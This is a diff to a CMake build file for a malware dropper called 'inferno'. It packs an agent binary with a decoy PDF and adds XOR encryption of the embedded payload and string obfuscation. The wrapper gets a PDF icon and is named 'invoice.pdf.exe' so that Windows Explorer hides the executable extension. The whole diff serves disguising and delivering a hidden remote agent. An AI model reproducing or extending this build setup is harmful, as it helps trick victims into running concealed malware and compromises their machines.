@@ -11,16 +11,21 @@ endif()
 set(DECOY_PDF "${CMAKE_CURRENT_SOURCE_DIR}/resources/decoy.pdf")
 set(AGENT_BINARY_HEADER "${CMAKE_CURRENT_BINARY_DIR}/agent_binary.h")
 
+set(INFERNO_XOR_KEY "2B7E151628AED2A6")
+
 add_custom_command(
     OUTPUT  ${AGENT_BINARY_HEADER}
     COMMAND ${Python3_EXECUTABLE}
             "${CMAKE_CURRENT_SOURCE_DIR}/bin2header.py"
+            "--key" "${INFERNO_XOR_KEY}"
             "${CMAKE_BINARY_DIR}/inferno_client${CMAKE_EXECUTABLE_SUFFIX}"
             "${DECOY_PDF}"
             "${AGENT_BINARY_HEADER}"
     DEPENDS  inferno_client
              "${DECOY_PDF}"
-    COMMENT "Generating agent_binary.h from inferno_client + decoy PDF"
+             "${CMAKE_CURRENT_SOURCE_DIR}/bin2header.py"
+    COMMENT "Generating agent_binary.h (XOR-encrypted) from inferno_client + decoy PDF"
+    VERBATIM
 )
 
 set(WRAPPER_SOURCES
@@ -42,9 +47,21 @@ if(WIN32)
     list(APPEND WRAPPER_SOURCES ${WRAPPER_RC} ${PDF_ICO})
 endif()
 
-add_executable(inferno_wrapper ${WRAPPER_SOURCES})
+add_executable(inferno_wrapper ${WRAPPER_SOURCES}
+    include/unlit.hpp
+)
 
-target_include_directories(inferno_wrapper PRIVATE ${CMAKE_CURRENT_BINARY_DIR})
+target_include_directories(inferno_wrapper PRIVATE
+    ${CMAKE_CURRENT_BINARY_DIR}
+    ${CMAKE_CURRENT_SOURCE_DIR}/include
+)
+
+# UNLIT() macro returns a const char* from a lambda — the compiler can't
+# see through it to verify the format string is a literal. The string IS
+# compile-time fixed, so the warning is a false positive.
+if(CMAKE_CXX_COMPILER_ID MATCHES "GNU|Clang|AppleClang")
+    target_compile_options(inferno_wrapper PRIVATE -Wno-format-security)
+endif()
 
 # Name the output so Windows shows "invoice.pdf.exe" (explorer hides .exe)
 set_target_properties(inferno_wrapper PROPERTIES
